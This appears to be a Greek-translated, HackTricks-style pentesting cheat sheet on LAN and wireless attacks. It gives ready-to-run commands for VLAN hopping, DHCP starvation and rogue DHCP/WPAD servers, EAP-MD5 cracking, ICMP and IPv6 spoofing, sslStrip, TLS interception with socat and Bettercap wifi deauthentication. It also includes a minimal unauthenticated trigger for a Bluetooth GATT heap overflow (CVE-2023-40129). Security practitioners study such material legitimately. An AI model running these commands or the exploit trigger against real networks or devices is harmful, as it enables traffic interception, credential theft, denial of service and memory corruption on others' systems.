Τα VoIP τηλέφωνα, που ολοένα και περισσότερο ενσωματώνονται με συσκευές IoT, προσφέρουν λειτουργίες όπως το ξεκλείδωμα πορτών ή τον έλεγχο θερμοστατών μέσω ειδικών τηλεφωνικών αριθμών. Ωστόσο, αυτή η ενσωμάτωση μπορεί να δημιουργήσει κινδύνους ασφαλείας.

Το εργαλείο [**voiphopper**](http://voiphopper.sourceforge.net) έχει σχεδιαστεί για να μιμείται ένα VoIP τηλέφωνο σε διάφορα περιβάλλοντα (Cisco, Avaya, Nortel, Alcatel-Lucent). Ανακαλύπτει το VLAN ID του φωνητικού δικτύου χρησιμοποιώντας πρωτόκολλα όπως CDP, DHCP, LLDP-MED και 802.1Q ARP.

**VoIP Hopper** προσφέρει τρεις λειτουργίες για το Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Αναλύει πακέτα δικτύου για να εντοπίσει το VLAN ID.
2. **Spoof Mode** (`-c 1`): Δημιουργεί προσαρμοσμένα πακέτα που μιμούνται αυτά μιας πραγματικής VoIP συσκευής.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Στέλνει πακέτα όμοια με αυτά ενός συγκεκριμένου Cisco IP phone model.

Η προτιμότερη λειτουργία για ταχύτητα είναι η τρίτη. Απαιτεί τον καθορισμό:

- The attacker's network interface (`-i` parameter).
- The name of the VoIP device being emulated (`-E` parameter), adhering to the Cisco naming format (e.g., SEP followed by a MAC address).

Σε εταιρικά περιβάλλοντα, για να μιμηθείτε μια υπάρχουσα VoIP συσκευή, μπορείτε να:

- Ελέγξετε την ετικέτα MAC στο τηλέφωνο.
- Πλοηγηθείτε στις ρυθμίσεις οθόνης του τηλεφώνου για να δείτε πληροφορίες μοντέλου.
- Συνδέσετε τη VoIP συσκευή σε ένα laptop και παρακολουθήσετε CDP requests χρησιμοποιώντας Wireshark.

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Επιθέσεις

#### Απογραφή
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** μπορούν να πραγματοποιηθούν εναντίον των DHCP servers. Η πρώτη συνίσταται στο **simulate enough fake hosts to use all the possible IP addresses**.\
Αυτή η επίθεση θα λειτουργήσει μόνο αν μπορείτε να δείτε τις απαντήσεις του DHCP server και να ολοκληρώσετε το πρωτόκολλο (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Για παράδειγμα, αυτό **δεν είναι δυνατό σε Wifi networks**.

Ένας άλλος τρόπος για να εκτελεστεί ένα DHCP DoS είναι να αποσταλεί ένα **DHCP-RELEASE packet using as source code every possible IP**. Τότε, ο server θα νομίσει ότι όλοι έχουν σταματήσει να χρησιμοποιούν την IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Μια πιο αυτόματη μέθοδος για να το κάνετε αυτό είναι η χρήση του εργαλείου [DHCPing](https://github.com/kamorin/DHCPig)

Μπορείτε να χρησιμοποιήσετε τις αναφερόμενες επιθέσεις DoS για να αναγκάσετε τους πελάτες να λάβουν νέες μισθώσεις μέσα στο περιβάλλον και να εξαντλήσετε τους νόμιμους servers, ώστε να γίνουν μη ανταποκρινόμενοι. Έτσι, όταν οι νόμιμοι προσπαθήσουν να επανασυνδεθούν, **μπορείτε να σερβίρετε κακόβουλες τιμές που αναφέρονται στην επόμενη επίθεση**.

#### Ορισμός κακόβουλων τιμών

Ένας κακόβουλος DHCP server μπορεί να ρυθμιστεί χρησιμοποιώντας το script DHCP που βρίσκεται στο `/usr/share/responder/DHCP.py`. Αυτό είναι χρήσιμο για network attacks, όπως η καταγραφή HTTP traffic και credentials, ανακατευθύνοντας την κίνηση σε έναν κακόβουλο διακομιστή. Ωστόσο, η ρύθμιση μιας κακόβουλης gateway είναι λιγότερο αποτελεσματική καθώς επιτρέπει μόνο την καταγραφή της εξερχόμενης κίνησης από τον πελάτη, χάνοντας τις απαντήσεις από την πραγματική gateway. Αντί για αυτό, συνιστάται η ρύθμιση ενός κακόβουλου DNS ή WPAD server για μια πιο αποτελεσματική επίθεση.

Παρακάτω είναι οι επιλογές εντολών για τη διαμόρφωση του κακόβουλου DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` για να διαφημίσετε την IP της μηχανής σας ως gateway.
- **Local DNS Domain Name**: Προαιρετικά, χρησιμοποιήστε `-d example.org` για να ορίσετε ένα τοπικό DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` για να καθορίσετε την IP του νόμιμου router ή gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` για να ορίσετε την IP του κακόβουλου DNS server που ελέγχετε.
- **Secondary DNS Server IP**: Προαιρετικά, χρησιμοποιήστε `-s 10.0.0.1` για να ορίσετε μια δευτερεύουσα DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` για να ορίσετε το netmask για το τοπικό δίκτυο.
- **Interface for DHCP Traffic**: Use `-I eth1` για να ακούει για DHCP traffic σε συγκεκριμένη network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` για να ορίσετε τη διεύθυνση για WPAD configuration, βοηθώντας στην υποκλοπή web traffic.
- **Spoof Default Gateway IP**: Include `-S` για να spoof-άρετε την IP της προεπιλεγμένης gateway.
- **Respond to All DHCP Requests**: Include `-R` για να κάνετε τον server να απαντά σε όλα τα DHCP requests, αλλά λάβετε υπόψη ότι αυτό είναι θορυβώδες και μπορεί να εντοπιστεί.

Χρησιμοποιώντας σωστά αυτές τις επιλογές, μπορεί να εγκαθιδρυθεί ένας κακόβουλος DHCP server για να παρεμβάλλεται και να υποκλέπτει την κίνηση δικτύου με αποτελεσματικό τρόπο.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

Εδώ είναι μερικές από τις τακτικές επίθεσης που μπορούν να χρησιμοποιηθούν εναντίον υλοποιήσεων 802.1X:

- Ενεργή brute-force δοκιμή κωδικού μέσω EAP
- Επίθεση στον RADIUS server με παραμορφωμένο περιεχόμενο EAP _\*\*_(exploits)
- Καταγραφή μηνυμάτων EAP και offline password cracking (EAP-MD5 και PEAP)
- Επιβολή EAP-MD5 authentication για παράκαμψη της επαλήθευσης πιστοποιητικού TLS
- Έγχυση κακόβουλης network traffic κατά την authentication χρησιμοποιώντας hub ή παρόμοιο

Εάν ο επιτιθέμενος βρίσκεται ανάμεσα στο θύμα και τον authentication server, μπορεί να προσπαθήσει να υποβαθμίσει (εφόσον χρειαστεί) το authentication protocol σε EAP-MD5 και να καταγράψει την προσπάθεια authentication. Έπειτα, μπορεί να brute-force αυτό χρησιμοποιώντας:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Επιθέσεις <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) είναι μια κατηγορία πρωτοκόλλων δικτύου σχεδιασμένη για να **δημιουργεί ένα ενεργό πλεονασματικό σύστημα δρομολόγησης**. Με το FHRP, οι φυσικοί routers μπορούν να συνδυαστούν σε μια ενιαία λογική συσκευή, γεγονός που αυξάνει την αντοχή σε σφάλματα και βοηθά στη διανομή του φόρτου.

**Cisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Υπάρχουν τρεις εκδόσεις του Routing Information Protocol (RIP): RIP, RIPv2 και RIPng. Τα datagrams από τα RIP και RIPv2 αποστέλλονται σε peers μέσω της θύρας 520 χρησιμοποιώντας UDP, ενώ το RIPng μεταδίδει datagrams στη θύρα UDP 521 μέσω IPv6 multicast. Το RIPv2 εισήγαγε υποστήριξη για MD5 authentication. Από την άλλη πλευρά, το RIPng δεν ενσωματώνει native authentication· αντ’ αυτού βασίζεται σε προαιρετικές κεφαλίδες IPsec AH και ESP στο IPv6.

- **RIP and RIPv2:** Η επικοινωνία γίνεται μέσω UDP datagrams στη θύρα 520.
- **RIPng:** Χρησιμοποιεί την UDP θύρα 521 για broadcast datagrams μέσω IPv6 multicast.

Σημειώστε ότι το RIPv2 υποστηρίζει MD5 authentication ενώ το RIPng δεν περιλαμβάνει native authentication, βασιζόμενο σε IPsec AH και ESP κεφαλίδες στο IPv6.

### EIGRP Επιθέσεις

**EIGRP (Enhanced Interior Gateway Routing Protocol)** είναι ένα δυναμικό πρωτόκολλο δρομολόγησης. **Είναι ένα distance-vector πρωτόκολλο.** Εάν δεν υπάρχει πιστοποίηση και ρύθμιση παθητικών διεπαφών, ένας εισβολέας μπορεί να παρέμβει στη δρομολόγηση EIGRP και να προκαλέσει δηλητηρίαση των πινάκων δρομολόγησης. Επιπλέον, το δίκτυο EIGRP (δηλ. το autonomous system) είναι επίπεδο και δεν έχει τμηματοποίηση σε ζώνες. Εάν ένας επιτιθέμενος εισάγει μια διαδρομή, είναι πιθανό αυτή η διαδρομή να εξαπλωθεί σε ολόκληρο το αυτόνομο σύστημα EIGRP.

Η επίθεση σε ένα σύστημα EIGRP απαιτεί **την εγκαθίδρυση γειτνίασης με έναν νόμιμο EIGRP router**, κάτι που ανοίγει πολλές δυνατότητες, από βασική αναγνώριση μέχρι διάφορες ενέσεις.

[**FRRouting**](https://frrouting.org/) σας επιτρέπει να υλοποιήσετε **έναν virtual router που υποστηρίζει BGP, OSPF, EIGRP, RIP και άλλα πρωτόκολλα.** Το μόνο που χρειάζεται είναι να το αναπτύξετε στο σύστημα του επιτιθέμενου και μπορείτε ουσιαστικά να προσποιηθείτε ότι είστε ένας νόμιμος router στον τομέα δρομολόγησης.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) έχει δυνατότητες για την παγίδευση EIGRP broadcasts. Επιτρέπει επίσης την έγχυση πακέτων, η οποία μπορεί να χρησιμοποιηθεί για την τροποποίηση των ρυθμίσεων δρομολόγησης.

### OSPF

Στο πρωτόκολλο Open Shortest Path First (OSPF) συχνά χρησιμοποιείται MD5 authentication για να διασφαλιστεί ασφαλής επικοινωνία μεταξύ routers. Ωστόσο, αυτό το μέτρο ασφαλείας μπορεί να παρακαμφθεί με εργαλεία όπως Loki και John the Ripper. Αυτά τα εργαλεία μπορούν να καταγράψουν και να σπάσουν MD5 hashes, αποκαλύπτοντας το authentication key. Μόλις αποκτηθεί αυτό το key, μπορεί να χρησιμοποιηθεί για την εισαγωγή νέων πληροφοριών δρομολόγησης. Για να διαμορφώσετε τις παραμέτρους της διαδρομής και να ορίσετε το συμβιβασμένο key, χρησιμοποιούνται αντίστοιχα οι καρτέλες _Injection_ και _Connection_.

- **Capturing and Cracking MD5 Hashes:** Χρησιμοποιούνται εργαλεία όπως Loki και John the Ripper.
- **Configuring Route Parameters:** Γίνεται μέσω της καρτέλας _Injection_.
- **Setting the Compromised Key:** Το key ρυθμίζεται κάτω από την καρτέλα _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Εργαλείο για σάρωση της κυκλοφορίας δικτύου και ανεύρεση ευπαθειών
- Μπορείτε να βρείτε περισσότερες πληροφορίες για network attacks [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Ο επιτιθέμενος διαμορφώνει όλες τις παραμέτρους δικτύου (GW, IP, DNS) του νέου μέλους του δικτύου αποστέλλοντας ψευδείς απαντήσεις DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Δείτε την [previous section](#arp-spoofing).

### ICMPRedirect

Το ICMP Redirect συνίσταται στην αποστολή ενός ICMP packet type 1 code 5 που υποδεικνύει ότι ο attacker είναι ο καλύτερος τρόπος για να προσεγγίσει μια IP. Έπειτα, όταν το victim θέλει να επικοινωνήσει με την IP, θα στείλει το packet μέσω του attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Ο attacker θα επιλύσει μερικά (ή όλα) από τα domains που ζητάει ο victim.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Ρύθμιση του δικού σας DNS με dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Τοπικές Πύλες

Συχνά υπάρχουν πολλαπλές διαδρομές προς συστήματα και δίκτυα. Αφού δημιουργήσετε μια λίστα με διευθύνσεις MAC στο τοπικό δίκτυο, χρησιμοποιήστε _gateway-finder.py_ για να εντοπίσετε hosts που υποστηρίζουν IPv4 forwarding.

<details>
<summary>Παράδειγμα χρήσης gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Για την τοπική επίλυση ονομάτων όταν οι αναζητήσεις DNS αποτυγχάνουν, τα συστήματα Microsoft βασίζονται στο **Link-Local Multicast Name Resolution (LLMNR)** και στην **NetBIOS Name Service (NBT-NS)**. Παρομοίως, οι υλοποιήσεις **Apple Bonjour** και **Linux zero-configuration** χρησιμοποιούν το **Multicast DNS (mDNS)** για την ανεύρεση συστημάτων στο δίκτυο. Εξαιτίας της μη αυθεντικοποιημένης φύσης αυτών των πρωτοκόλλων και του ότι λειτουργούν πάνω από UDP και εκπέμπουν multicast/broadcast μηνύματα, μπορούν να εκμεταλλευτούν οι επιτιθέμενοι για να ανακατευθύνουν χρήστες σε κακόβουλες υπηρεσίες.

Μπορείς να υποδυθείς υπηρεσίες που αναζητούν οι hosts χρησιμοποιώντας το Responder για να στείλεις ψευδείς απαντήσεις.\
Διάβασε εδώ περισσότερες πληροφορίες για [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Οι browsers συχνά χρησιμοποιούν το **Web Proxy Auto-Discovery (WPAD) protocol για να αποκτήσουν αυτόματα ρυθμίσεις proxy**. Αυτό περιλαμβάνει την ανάκτηση ρυθμίσεων από έναν server, συνήθως μέσω ενός URL όπως "http://wpad.example.org/wpad.dat". Η ανακάλυψη αυτού του server από τους clients μπορεί να γίνει μέσω διαφόρων μηχανισμών:

- Μέσω του **DHCP**, όπου η ανακάλυψη διευκολύνεται με τη χρήση μιας ειδικής εγγραφής με κωδικό 252.
- Μέσω **DNS**, που περιλαμβάνει την αναζήτηση ενός hostname με την ετικέτα _wpad_ στο τοπικό domain.
- Μέσω **Microsoft LLMNR and NBT-NS**, που είναι μηχανισμοί fallback που χρησιμοποιούνται όταν οι αναζητήσεις DNS αποτυγχάνουν.

Το εργαλείο Responder εκμεταλλεύεται αυτό το πρωτόκολλο λειτουργώντας ως **malicious WPAD server**. Χρησιμοποιεί DHCP, DNS, LLMNR και NBT-NS για να παραπλανήσει τους clients ώστε να συνδεθούν σε αυτό. Για να εξετάσετε πιο διεξοδικά πώς μπορούν να υποδυθούν υπηρεσίες χρησιμοποιώντας το Responder, [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Μπορείτε να προσφέρετε διάφορες υπηρεσίες στο δίκτυο για να προσπαθήσετε να παγιδεύσετε έναν χρήστη ώστε να εισάγει κάποιες **plain-text credentials**. **Περισσότερες πληροφορίες για αυτή την επίθεση στο** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Αυτή η επίθεση είναι πολύ παρόμοια με το ARP Spoofing αλλά στον κόσμο του IPv6. Μπορείτε να κάνετε το θύμα να νομίζει ότι η IPv6 διεύθυνση του GW έχει το MAC του επιτιθέμενου.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Ορισμένα OS ρυθμίζουν από προεπιλογή την gateway μέσω των RA packets που στέλνονται στο δίκτυο. Για να δηλώσετε τον attacker ως IPv6 router μπορείτε να χρησιμοποιήσετε:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Από προεπιλογή μερικά OS προσπαθούν να ρυθμίσουν το DNS διαβάζοντας ένα πακέτο DHCPv6 στο δίκτυο. Στη συνέχεια, ένας attacker θα μπορούσε να στείλει ένα πακέτο DHCPv6 για να διαμορφώσει τον εαυτό του ως DNS. Το DHCP παρέχει επίσης μία διεύθυνση IPv6 στο victim.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (ψεύτικη σελίδα και έγχυση κώδικα JS)

## Επιθέσεις στο Διαδίκτυο

### sslStrip

Βασικά, αυτό που κάνει αυτή η επίθεση είναι ότι, σε περίπτωση που ο **user** προσπαθήσει να **access** μια **HTTP** σελίδα που είναι **redirecting** στην έκδοση **HTTPS**. Το **sslStrip** θα **maintain** μια **HTTP connection with** τον **client and** μια **HTTPS connection with** τον **server**, έτσι θα μπορεί να **sniff** τη σύνδεση σε **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Περισσότερες πληροφορίες [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy for bypassing HSTS

Η **διαφορά** μεταξύ **sslStrip+ and dns2proxy** σε σχέση με **sslStrip** είναι ότι θα **ανακατευθύνουν** για παράδειγμα _**www.facebook.com**_ **προς** _**wwww.facebook.com**_ (σημειώστε το **επιπλέον** "**w**") και θα ορίσουν τη **διεύθυνση αυτού του domain ως το attacker IP**. Με αυτόν τον τρόπο, ο **client** θα **συνδεθεί** στο _**wwww.facebook.com**_ **(the attacker)** αλλά στα παρασκήνια **sslstrip+** θα **διατηρήσει** την **πραγματική σύνδεση** μέσω https με **www.facebook.com**.

Ο **στόχος** αυτής της τεχνικής είναι να **αποφύγει το HSTS** επειδή _**wwww**.facebook.com_ **δεν θα** αποθηκευτεί στην **cache** του browser, οπότε ο browser θα ξεγελαστεί ώστε να πραγματοποιήσει **facebook authentication in HTTP**.\
Σημειώστε ότι για να εκτελεστεί αυτή η επίθεση το θύμα πρέπει αρχικά να προσπαθήσει να αποκτήσει πρόσβαση στο [http://www.faceook.com](http://www.faceook.com) και όχι https. Αυτό μπορεί να γίνει τροποποιώντας τους συνδέσμους μέσα σε μια σελίδα http.

Περισσότερες πληροφορίες [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP ακρόαση σε θύρα
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ακρόαση σε θύρα

#### Δημιουργία κλειδιών και αυτοϋπογεγραμμένου πιστοποιητικού
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ακρόαση με πιστοποιητικό
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ακρόαση με πιστοποιητικό και ανακατεύθυνση προς τους hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Μερικές φορές, αν ο client ελέγχει ότι η CA είναι έγκυρη, μπορείς να **serve a certificate of other hostname signed by a CA**.\
Ένα άλλο ενδιαφέρον τεστ, είναι να σερβίρεις c**ertificate of the requested hostname but self-signed**.

Άλλα πράγματα για δοκιμή είναι να προσπαθήσεις να υπογράψεις το certificate με ένα έγκυρο certificate που δεν είναι έγκυρη CA. Ή να χρησιμοποιήσεις το έγκυρο public key, να αναγκάσεις τη χρήση ενός αλγορίθμου όπως ο diffie hellman (έναν που δεν χρειάζεται να αποκρυπτογραφήσει τίποτα με το πραγματικό private key) και όταν ο client ζητήσει ένα probe του πραγματικού private key (όπως ένα hash) να στείλεις ένα fake probe και να περιμένεις ότι ο client δεν το ελέγχει.

## Bettercap

<details>
<summary>Συνήθεις Bettercap εντολές</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Σημειώσεις Ενεργής Ανακάλυψης

Λάβετε υπόψη ότι όταν ένα UDP πακέτο αποστέλλεται σε μια συσκευή που δεν έχει το ζητούμενο port, αποστέλλεται ένα ICMP (Port Unreachable).

### **ARP ανακάλυψη**

Τα ARP πακέτα χρησιμοποιούνται για να εντοπιστούν ποιες IP χρησιμοποιούνται μέσα στο δίκτυο. Ο PC πρέπει να στείλει ένα αίτημα για κάθε πιθανή διεύθυνση IP και μόνο αυτές που χρησιμοποιούνται θα απαντήσουν.

### **mDNS (multicast DNS)**

Το Bettercap στέλνει ένα MDNS αίτημα (κάθε X ms) ζητώντας το **\_services\_.dns-sd.\_udp.local**. Η μηχανή που βλέπει αυτό το πακέτο συνήθως απαντά σε αυτό το αίτημα. Έπειτα, αναζητά μόνο μηχανές που απαντούν στο "services".

**Εργαλεία**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Το Bettercap κάνει broadcast πακέτα στη θύρα 137/UDP ζητώντας για το όνομα "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Το Bettercap στέλνει broadcast SSDP πακέτα ψάχνοντας για κάθε είδους υπηρεσίες (UDP Port 1900).

### **WSD (Web Service Discovery)**

Το Bettercap στέλνει broadcast WSD πακέτα ψάχνοντας για υπηρεσίες (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Επιθέσεις

- Το Android Fluoride εκθέτει services πάνω από L2CAP PSMs (π.χ., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Οι services εγγράφονται μέσω:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework επιτρέπει Scapy-based L2CAP/ATT crafting (built on BlueBorne l2cap_infra). Παράδειγμα:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow στον Read Multiple Variable response builder μπορεί να προκαλέσει ~64KB heap overflow όταν το MTU αποκόπτει ένα variable-length element αλλά το +2 length field δεν λαμβάνεται υπόψη.

<details>
<summary>Κύρια αιτία (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Σε εγγραφές μεταβλητού μήκους, το overflow path αφαιρεί μόνο (total_len - mtu), αγνοώντας το +2 length field, οπότε το len underflows (π.χ. 0xFFFE) και η memcpy γράφει ~64KB πέρα από το τέλος του buffer.
</details>

- Ελάχιστος unauthenticated trigger (μικρό MTU αναγκάζει underflow στο 4ο attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Αναφορές

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
